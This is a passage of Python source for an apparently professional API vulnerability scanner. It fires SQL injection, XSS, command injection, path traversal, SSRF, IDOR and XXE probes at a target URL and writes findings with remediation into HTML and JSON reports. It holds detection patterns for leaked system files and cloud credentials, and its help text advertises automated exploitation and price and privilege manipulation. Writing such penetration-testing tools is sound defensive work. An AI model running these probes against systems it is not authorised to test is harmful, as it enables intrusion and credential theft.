            'admin', 'role', 'permission', 'debug', 'test',
            'price', 'amount', 'quantity', 'discount'
        ]
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        found_params = []
        
        for param in common_params:
            test_data = {param: "test123"}
            try:
                if endpoint_data['method'] == 'GET':
                    response = self.session.get(url, params=test_data, timeout=5, verify=False, proxies=self.proxy)
                else:
                    response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=5, verify=False, proxies=self.proxy)
                
                if response.status_code not in [404, 405]:
                    found_params.append(param)
                    print(f"{Colors.GREEN}[✓] Found parameter: {param}{Colors.END}")
                    
            except Exception:
                pass
        
        return found_params

    def test_sql_injection(self, endpoint_data: Dict, params: List[str]):
        """Test for SQL Injection vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing SQL Injection...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['sqli']:
                test_data = {param: payload}
                
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    sql_errors = [
                        'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
                        'syntax error', 'unclosed quotation', 'quoted string',
                        'database error', 'warning: mysql', 'pg_query()',
                        'sqlstate', 'db2 sql error', 'odbc driver', 'microsoft sql'
                    ]
                    
                    response_text = response.text.lower()
                    
                    for error in sql_errors:
                        if error in response_text:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='SQL Injection',
                                severity='CRITICAL',
                                description=f'SQL injection vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'SQL error pattern detected: {error}',
                                remediation='Use parameterized queries/prepared statements. Implement input validation and sanitization.'
                            )
                            print(f"{Colors.RED}[!] SQL Injection found in parameter: {param}{Colors.END}")
                            break
                    
                    # Time-based detection
                    if 'WAITFOR' in payload or 'SLEEP' in payload.upper():
                        if response.elapsed.total_seconds() > 4:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Blind SQL Injection (Time-based)',
                                severity='CRITICAL',
                                description=f'Time-based blind SQL injection detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'Response delayed by {response.elapsed.total_seconds():.2f} seconds',
                                remediation='Use parameterized queries/prepared statements. Implement input validation.'
                            )
                            print(f"{Colors.RED}[!] Blind SQL Injection (time-based) found in parameter: {param}{Colors.END}")
                
                except Exception as e:
                    pass

    def test_xss(self, endpoint_data: Dict, params: List[str]):
        """Test for Cross-Site Scripting vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing XSS...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['xss']:
                test_data = {param: payload}
                
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    if payload in response.text or urllib.parse.quote(payload) in response.text:
                        if '<script>' in response.text.lower() or 'onerror=' in response.text.lower() or 'onload=' in response.text.lower():
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Cross-Site Scripting (XSS)',
                                severity='HIGH',
                                description=f'XSS vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence='Payload reflected in response without proper encoding',
                                remediation='Implement output encoding, Content Security Policy (CSP), and input validation.'
                            )
                            print(f"{Colors.RED}[!] XSS found in parameter: {param}{Colors.END}")
                            break
                
                except Exception:
                    pass

    def test_command_injection(self, endpoint_data: Dict, params: List[str]):
        """Test for Command Injection vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing Command Injection...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['command_injection']:
                test_data = {param: payload}
                
                try:
                    start_time = time.time()
                    
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=15, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=15, verify=False, proxies=self.proxy)
                    
                    elapsed = time.time() - start_time
                    
                    cmd_patterns = [
                        'root:', 'bin:', 'daemon:', '/bin/bash', '/bin/sh',
                        'uid=', 'gid=', '[boot loader]', 'PING', '64 bytes from',
                        'www-data', 'nobody'
                    ]
                    
                    for pattern in cmd_patterns:
                        if pattern in response.text:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Command Injection',
                                severity='CRITICAL',
                                description=f'Command injection vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'Command output detected in response: {pattern}',
                                remediation='Avoid system calls. Use safe APIs. Implement strict input validation and whitelist allowed commands.'
                            )
                            print(f"{Colors.RED}[!] Command Injection found in parameter: {param}{Colors.END}")
                            break
                    
                    if 'sleep' in payload and elapsed > 4:
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'],
                            method=endpoint_data['method'],
                            vuln_type='Blind Command Injection',
                            severity='CRITICAL',
                            description=f'Time-based command injection detected in parameter "{param}"',
                            payload=payload,
                            response_code=response.status_code,
                            evidence=f'Response delayed by {elapsed:.2f} seconds',
                            remediation='Avoid system calls. Use safe APIs. Implement strict input validation.'
                        )
                        print(f"{Colors.RED}[!] Blind Command Injection found in parameter: {param}{Colors.END}")
                
                except Exception:
                    pass

    def test_path_traversal(self, endpoint_data: Dict, params: List[str]):
        """Test for Path Traversal vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing Path Traversal...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['path_traversal']:
                test_data = {param: payload}
                
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    traversal_patterns = [
                        'root:', 'bin:', 'daemon:',
                        '[boot loader]', '[operating systems]',
                        '; for 16-bit app support'
                    ]
                    
                    for pattern in traversal_patterns:
                        if pattern in response.text:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Path Traversal',
                                severity='HIGH',
                                description=f'Path traversal vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'System file content detected: {pattern}',
                                remediation='Implement strict path validation. Use whitelist of allowed paths. Avoid direct file access.'
                            )
                            print(f"{Colors.RED}[!] Path Traversal found in parameter: {param}{Colors.END}")
                            break
                
                except Exception:
                    pass

    def test_ssrf(self, endpoint_data: Dict, params: List[str]):
        """Test for Server-Side Request Forgery vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing SSRF...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['ssrf']:
                test_data = {param: payload}
                
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    ssrf_patterns = [
                        'ami-id', 'instance-id', 'security-credentials',
                        'computeMetadata', 'latest/meta-data', 'AccessKeyId',
                        'privateIp', 'publicIp'
                    ]
                    
                    for pattern in ssrf_patterns:
                        if pattern in response.text:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Server-Side Request Forgery (SSRF)',
                                severity='CRITICAL',
                                description=f'SSRF vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'Internal/cloud metadata accessible: {pattern}',
                                remediation='Implement URL whitelist. Disable redirects. Use separate networks for internal services.'
                            )
                            print(f"{Colors.RED}[!] SSRF found in parameter: {param}{Colors.END}")
                            break
                
                except Exception:
                    pass

    def test_idor(self, endpoint_data: Dict, params: List[str]):
        """Test for Insecure Direct Object Reference vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing IDOR...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        if not any(keyword in endpoint_data['endpoint'].lower() for keyword in ['user', 'profile', 'account', 'order', 'document', 'file']):
            return
        
        for param in params:
            if param.lower() in ['id', 'user', 'userid', 'accountid', 'orderid']:
                responses = {}
                
                for test_id in self.payloads['idor']:
                    test_data = {param: test_id}
                    
                    try:
                        if endpoint_data['method'] == 'GET':
                            response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                        else:
                            response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                        
                        if response.status_code == 200:
                            responses[test_id] = len(response.content)
                    
                    except Exception:
                        pass
                
                if len(responses) > 1 and len(set(responses.values())) > 1:
                    self._add_finding(
                        endpoint=endpoint_data['endpoint'],
                        method=endpoint_data['method'],
                        vuln_type='Insecure Direct Object Reference (IDOR)',
                        severity='HIGH',
                        description=f'IDOR vulnerability detected - unauthorized access to objects via parameter "{param}"',
                        payload=', '.join(responses.keys()),
                        response_code=200,
                        evidence=f'Multiple object IDs accessible without proper authorization check',
                        remediation='Implement proper authorization checks. Verify user permissions before accessing objects.'
                    )
                    print(f"{Colors.RED}[!] IDOR found in parameter: {param}{Colors.END}")

    def test_security_headers(self):
        """Test for missing security headers"""
        print(f"\n{Colors.YELLOW}[*] Testing Security Headers...{Colors.END}")
        
        try:
            response = self.session.get(self.base_url, timeout=10, verify=False, proxies=self.proxy)
            
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME-sniffing protection',
                'Strict-Transport-Security': 'HTTPS enforcement',
                'Content-Security-Policy': 'XSS protection',
                'X-XSS-Protection': 'XSS filter',
                'Referrer-Policy': 'Referrer leakage protection'
            }
            
            missing_headers = []
            for header, description in security_headers.items():
                if header not in response.headers:
                    missing_headers.append(f"{header} ({description})")
            
            if missing_headers:
                self._add_finding(
                    endpoint=self.base_url,
                    method='GET',
                    vuln_type='Missing Security Headers',
                    severity='MEDIUM',
                    description='Critical security headers are missing',
                    payload='N/A',
                    response_code=response.status_code,
                    evidence=f"Missing headers: {', '.join(missing_headers)}",
                    remediation='Implement all security headers with appropriate values.'
                )
                print(f"{Colors.YELLOW}[!] Missing security headers detected{Colors.END}")
        
        except Exception:
            pass

    def test_xxe(self, endpoint_data: Dict):
        """Test for XML External Entity vulnerabilities"""
        if 'xml' not in endpoint_data.get('content_type', '').lower():
            return
        
        print(f"{Colors.YELLOW}[*] Testing XXE...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for payload in self.payloads['xxe']:
            try:
                headers = self.headers.copy()
                headers['Content-Type'] = 'application/xml'
                
                response = self.session.request(
                    endpoint_data['method'],
                    url,
                    data=payload,
                    headers=headers,
                    timeout=10,
                    verify=False,
                    proxies=self.proxy
                )
                
                xxe_patterns = ['root:', 'bin:', 'daemon:', '[boot loader]']
                
                for pattern in xxe_patterns:
                    if pattern in response.text:
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'],
                            method=endpoint_data['method'],
                            vuln_type='XML External Entity (XXE)',
                            severity='CRITICAL',
                            description='XXE vulnerability allows reading local files',
                            payload=payload[:100] + '...',
                            response_code=response.status_code,
                            evidence=f'Local file content detected: {pattern}',
                            remediation='Disable external entity processing in XML parser. Use less complex data formats like JSON.'
                        )
                        print(f"{Colors.RED}[!] XXE vulnerability found{Colors.END}")
                        break
            
            except Exception:
                pass

    def _add_finding(self, endpoint: str, method: str, vuln_type: str, severity: str,
                     description: str, payload: str, response_code: int, evidence: str, 
                     remediation: str, manipulation_details: str = ""):
        """Add a finding to the results"""
        finding = Finding(
            endpoint=endpoint,
            method=method,
            vulnerability_type=vuln_type,
            severity=severity,
            description=description,
            payload=payload,
            response_code=response_code,
            evidence=evidence,
            remediation=remediation,
            timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            manipulation_details=manipulation_details
        )
        self.findings.append(finding)

    def run_full_scan(self, wordlist: List[str] = None):
        """Execute complete vulnerability scan"""
        self.print_banner()
        
        # Phase 1: Discovery
        self.discover_endpoints(wordlist)
        
        if not self.endpoints:
            print(f"{Colors.RED}[!] No endpoints discovered. Exiting.{Colors.END}")
            return
        
        # Phase 2: Vulnerability Testing
        print(f"\n{Colors.BOLD}[+] Phase 3: OWASP Top 10 Vulnerability Testing{Colors.END}")
        
        for endpoint_data in self.endpoints:
            print(f"\n{Colors.CYAN}[*] Testing: {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")
            
            # Fuzz parameters
            params = self.fuzz_parameters(endpoint_data)
            
            if params:
                # Run all vulnerability tests
                self.test_sql_injection(endpoint_data, params)
                self.test_xss(endpoint_data, params)
                self.test_command_injection(endpoint_data, params)
                self.test_path_traversal(endpoint_data, params)
                self.test_ssrf(endpoint_data, params)
                self.test_idor(endpoint_data, params)
            
            # Test XXE regardless of parameters
            self.test_xxe(endpoint_data)
            
            # Test API data manipulation for POST/PUT/PATCH endpoints with JSON
            if endpoint_data.get('has_json'):
                self.test_api_data_manipulation(endpoint_data)
        
        # Phase 3: Additional API-specific tests
        self.test_graphql_introspection()
        self.test_authentication_bypass()
        self.test_rate_limiting()
        self.test_security_headers()
        
        # Generate report
        self.generate_report()

    def generate_report(self):
        """Generate comprehensive findings report"""
        print(f"\n{Colors.BOLD}{'='*100}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}                              VULNERABILITY ASSESSMENT REPORT{Colors.END}")
        print(f"{Colors.BOLD}{'='*100}{Colors.END}\n")
        
        if not self.findings:
            print(f"{Colors.GREEN}[+] No vulnerabilities detected!{Colors.END}\n")
            return
        
        # Sort findings by severity
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        sorted_findings = sorted(self.findings, key=lambda x: severity_order.get(x.severity, 999))
        
        # Summary statistics
        summary = {
            'CRITICAL': len([f for f in self.findings if f.severity == 'CRITICAL']),
            'HIGH': len([f for f in self.findings if f.severity == 'HIGH']),
            'MEDIUM': len([f for f in self.findings if f.severity == 'MEDIUM']),
            'LOW': len([f for f in self.findings if f.severity == 'LOW'])
        }
        
        print(f"{Colors.BOLD}EXECUTIVE SUMMARY{Colors.END}")
        print(f"{'─'*100}")
        print(f"Target: {self.base_url}")
        print(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total Vulnerabilities: {len(self.findings)}")
        print(f"Endpoints Analyzed: {len(self.endpoints)}")
        print(f"JSON Patterns Discovered: {len(self.json_patterns)}")
        print(f"\n{Colors.RED}Critical: {summary['CRITICAL']}{Colors.END} | " +
              f"{Colors.YELLOW}High: {summary['HIGH']}{Colors.END} | " +
              f"{Colors.CYAN}Medium: {summary['MEDIUM']}{Colors.END} | " +
              f"{Colors.WHITE}Low: {summary['LOW']}{Colors.END}\n")
        
        # Detailed findings table
        print(f"{Colors.BOLD}DETAILED FINDINGS{Colors.END}")
        print(f"{'─'*100}")
        
        # Table header
        header = f"{'#':<4} {'SEVERITY':<10} {'TYPE':<35} {'ENDPOINT':<40} {'METHOD':<8}"
        print(f"{Colors.BOLD}{header}{Colors.END}")
        print(f"{'─'*100}")
        
        # Table rows
        for idx, finding in enumerate(sorted_findings, 1):
            severity_color = {
                'CRITICAL': Colors.RED,
                'HIGH': Colors.YELLOW,
                'MEDIUM': Colors.CYAN,
                'LOW': Colors.WHITE
            }.get(finding.severity, Colors.WHITE)
            
            row = f"{idx:<4} {severity_color}{finding.severity:<10}{Colors.END} " +\
                  f"{finding.vulnerability_type:<35} {finding.endpoint[:38]:<40} {finding.method:<8}"
            print(row)
        
        print(f"\n{'='*100}\n")
        
        # Detailed vulnerability information
        print(f"{Colors.BOLD}VULNERABILITY DETAILS{Colors.END}\n")
        
        for idx, finding in enumerate(sorted_findings, 1):
            severity_color = {
                'CRITICAL': Colors.RED,
                'HIGH': Colors.YELLOW,
                'MEDIUM': Colors.CYAN,
                'LOW': Colors.WHITE
            }.get(finding.severity, Colors.WHITE)
            
            print(f"{Colors.BOLD}[{idx}] {severity_color}{finding.severity}{Colors.END} - {Colors.BOLD}{finding.vulnerability_type}{Colors.END}")
            print(f"{'─'*100}")
            print(f"Endpoint:      {finding.method} {finding.endpoint}")
            print(f"Description:   {finding.description}")
            print(f"Evidence:      {finding.evidence}")
            print(f"Payload:       {finding.payload[:150]}{'...' if len(finding.payload) > 150 else ''}")
            print(f"HTTP Code:     {finding.response_code}")
            print(f"Timestamp:     {finding.timestamp}")
            if finding.manipulation_details:
                print(f"Manipulation:  {finding.manipulation_details}")
            print(f"\n{Colors.CYAN}Remediation:{Colors.END}")
            print(f"  {finding.remediation}")
            print(f"\n{'─'*100}\n")
        
        # Save to file
        self._save_report_to_file(sorted_findings, summary)

    def _save_report_to_file(self, sorted_findings: List[Finding], summary: Dict):
        """Save findings to JSON and HTML files"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # JSON Report
        json_filename = f"/mnt/user-data/outputs/api_scan_{timestamp}.json"
        json_data = {
            'scan_info': {
                'target': self.base_url,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'total_vulnerabilities': len(self.findings),
                'endpoints_analyzed': len(self.endpoints),
                'json_patterns_discovered': len(self.json_patterns),
                'cookies_used': bool(self.cookies)
            },
            'summary': summary,
            'findings': [asdict(f) for f in sorted_findings],
            'json_patterns': self.json_patterns[:10]  # Include first 10 patterns
        }
        
        with open(json_filename, 'w') as f:
            json.dump(json_data, f, indent=2)
        
        # HTML Report
        html_filename = f"/mnt/user-data/outputs/api_scan_{timestamp}.html"
        html_content = self._generate_html_report(sorted_findings, summary)
        
        with open(html_filename, 'w') as f:
            f.write(html_content)
        
        print(f"{Colors.GREEN}[+] Reports saved:{Colors.END}")
        print(f"    JSON: {json_filename}")
        print(f"    HTML: {html_filename}\n")

    def _generate_html_report(self, sorted_findings: List[Finding], summary: Dict) -> str:
        """Generate HTML report"""
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>API Vulnerability Scan Report - Ghost Ops Security</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1400px; margin: 0 auto; background: white; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; }}
        h2 {{ color: #34495e; margin-top: 30px; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; margin: -30px -30px 30px -30px; }}
        .summary {{ display: flex; justify-content: space-around; margin: 20px 0; }}
        .summary-box {{ padding: 20px; border-radius: 5px; text-align: center; flex: 1; margin: 0 10px; }}
        .critical {{ background: #e74c3c; color: white; }}
        .high {{ background: #e67e22; color: white; }}
        .medium {{ background: #f39c12; color: white; }}
        .low {{ background: #95a5a6; color: white; }}
        .summary-box h3 {{ margin: 0; font-size: 36px; }}
        .summary-box p {{ margin: 5px 0 0 0; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th {{ background: #34495e; color: white; padding: 12px; text-align: left; }}
        td {{ padding: 10px; border-bottom: 1px solid #ddd; }}
        tr:hover {{ background: #f8f9fa; }}
        .vuln-detail {{ margin: 20px 0; padding: 20px; border-left: 4px solid #3498db; background: #ecf0f1; }}
        .severity-badge {{ padding: 5px 10px; border-radius: 3px; color: white; font-weight: bold; }}
        .code {{ background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px; overflow-x: auto; font-family: monospace; }}
        .manipulation {{ background: #3498db; color: white; padding: 8px; margin: 5px 0; border-radius: 3px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ API Vulnerability Assessment Report v2.0</h1>
            <p><strong>Ghost Ops Security</strong> - Advanced API Testing with Pattern Analysis</p>
            <p>Target: {self.base_url}</p>
            <p>Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>Endpoints Analyzed: {len(self.endpoints)} | JSON Patterns: {len(self.json_patterns)}</p>
        </div>
        
        <h2>Executive Summary</h2>
        <div class="summary">
            <div class="summary-box critical">
                <h3>{summary['CRITICAL']}</h3>
                <p>Critical</p>
            </div>
            <div class="summary-box high">
                <h3>{summary['HIGH']}</h3>
                <p>High</p>
            </div>
            <div class="summary-box medium">
                <h3>{summary['MEDIUM']}</h3>
                <p>Medium</p>
            </div>
            <div class="summary-box low">
                <h3>{summary['LOW']}</h3>
                <p>Low</p>
            </div>
        </div>
        
        <h2>Findings Overview</h2>
        <table>
            <tr>
                <th>#</th>
                <th>Severity</th>
                <th>Vulnerability Type</th>
                <th>Endpoint</th>
                <th>Method</th>
            </tr>
"""
        
        for idx, finding in enumerate(sorted_findings, 1):
            severity_class = finding.severity.lower()
            html += f"""
            <tr>
                <td>{idx}</td>
                <td><span class="severity-badge {severity_class}">{finding.severity}</span></td>
                <td>{finding.vulnerability_type}</td>
                <td>{finding.endpoint}</td>
                <td>{finding.method}</td>
            </tr>
"""
        
        html += """
        </table>
        
        <h2>Detailed Findings</h2>
"""
        
        for idx, finding in enumerate(sorted_findings, 1):
            severity_class = finding.severity.lower()
            manipulation_html = ""
            if finding.manipulation_details:
                manipulation_html = f'<div class="manipulation"><strong>Data Manipulation:</strong> {finding.manipulation_details}</div>'
            
            html += f"""
        <div class="vuln-detail">
            <h3>[{idx}] <span class="severity-badge {severity_class}">{finding.severity}</span> {finding.vulnerability_type}</h3>
            <p><strong>Endpoint:</strong> {finding.method} {finding.endpoint}</p>
            <p><strong>Description:</strong> {finding.description}</p>
            <p><strong>Evidence:</strong> {finding.evidence}</p>
            {manipulation_html}
            <p><strong>Payload:</strong></p>
            <div class="code">{finding.payload[:300]}{'...' if len(finding.payload) > 300 else ''}</div>
            <p><strong>HTTP Response Code:</strong> {finding.response_code}</p>
            <p><strong>Timestamp:</strong> {finding.timestamp}</p>
            <p><strong>Remediation:</strong> {finding.remediation}</p>
        </div>
"""
        
        html += """
    </div>
</body>
</html>
"""
        return html


def main():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════╗
║           API VULNERABILITY SCANNER v2.0 - Ghost Ops Security             ║
║        Advanced OWASP API Security Testing with Pattern Analysis          ║
╚═══════════════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    
    parser = argparse.ArgumentParser(
        description=banner,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════════════════
USAGE EXAMPLES
═══════════════════════════════════════════════════════════════════════════{Colors.END}

{Colors.GREEN}Basic Scan:{Colors.END}
  python3 %(prog)s -u https://api.example.com

{Colors.GREEN}With JWT Authentication:{Colors.END}
  python3 %(prog)s -u https://api.example.com \\
    -H "Authorization: Bearer eyJhbGc..."

{Colors.GREEN}With Cookie Authentication:{Colors.END}
  python3 %(prog)s -u https://api.example.com \\
    --cookie "session=abc123;PHPSESSID=xyz789"

{Colors.GREEN}With Multiple Headers:{Colors.END}
  python3 %(prog)s -u https://api.example.com \\
    -H "Authorization: Bearer TOKEN" \\
    -H "X-API-Key: your-key" \\
    -H "Content-Type: application/json"

{Colors.GREEN}Complete E-commerce Pentest:{Colors.END}
  python3 %(prog)s -u https://api.shop.com \\
    -H "Authorization: Bearer TOKEN" \\
    --cookie "cart=xyz;session=abc" \\
    -w endpoints.txt \\
    -t 15 \\
    --proxy http://127.0.0.1:8080

{Colors.GREEN}Through Burp Suite:{Colors.END}
  python3 %(prog)s -u https://api.example.com \\
    -H "Authorization: Bearer TOKEN" \\
    --proxy http://127.0.0.1:8080

{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════════════════
KEY FEATURES
═══════════════════════════════════════════════════════════════════════════{Colors.END}

{Colors.YELLOW}✓{Colors.END} JSON Pattern Analysis         - Intelligent field discovery
{Colors.YELLOW}✓{Colors.END} API Data Manipulation         - Automated exploitation (50+ tests)
{Colors.YELLOW}✓{Colors.END} Cookie Authentication         - Session-based auth support
{Colors.YELLOW}✓{Colors.END} GraphQL Security Testing      - Schema introspection & queries
{Colors.YELLOW}✓{Colors.END} JWT Attack Vectors            - Algorithm confusion & tampering
{Colors.YELLOW}✓{Colors.END} OWASP API Top 10 2023         - Complete coverage
{Colors.YELLOW}✓{Colors.END} Business Logic Testing        - Price/privilege manipulation
{Colors.YELLOW}✓{Colors.END} Professional Reporting        - HTML, JSON, Console output

{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════════════════
VULNERABILITY DETECTION
═══════════════════════════════════════════════════════════════════════════{Colors.END}

{Colors.RED}CRITICAL:{Colors.END}  SQL Injection • Command Injection • SSRF • XXE
           Authentication Bypass • Price Manipulation • Privilege Escalation

{Colors.YELLOW}HIGH:{Colors.END}      XSS • Path Traversal • IDOR • GraphQL Exposure • JWT Flaws

{Colors.CYAN}MEDIUM:{Colors.END}    Missing Security Headers • Rate Limiting • Info Disclosure

{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════════════════{Colors.END}

{Colors.WHITE}For complete documentation, see: README_V2.md
For quick reference, see: QUICKSTART.txt
For version comparison, see: VERSION_COMPARISON.txt{Colors.END}

{Colors.BOLD}Ghost Ops Security - Professional Penetration Testing Tools{Colors.END}
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target API base URL')
    parser.add_argument('-H', '--header', action='append', help='Custom headers (can be used multiple times)')
    parser.add_argument('-w', '--wordlist', help='Custom endpoint wordlist file')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--cookie', help='Cookie string (e.g., "session=abc123;user=admin")')
    
    args = parser.parse_args()
    
    # Parse headers
    headers = {}
    if args.header:
        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    
    # Parse cookies
    cookies = {}
    if args.cookie:
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    # Parse proxy
    proxy = None
    if args.proxy:
        proxy = {
            'http': args.proxy,
            'https': args.proxy
        }
    
    # Load wordlist
    wordlist = None
    if args.wordlist:
        try:
            with open(args.wordlist, 'r') as f:
                wordlist = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[!] Error loading wordlist: {e}{Colors.END}")
            sys.exit(1)
    
    # Initialize and run scanner
    scanner = APIVulnScanner(
        base_url=args.url,
        headers=headers,
        proxy=proxy,
        threads=args.threads,
        cookies=cookies
    )
    
    try:
        scanner.run_full_scan(wordlist)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
        if scanner.findings:
            scanner.generate_report()
    except Exception as e:
        print(f"{Colors.RED}[!] Error during scan: {e}{Colors.END}")
        import traceback
        traceback.print_exc()


if __name__ == '__main__':
    main()
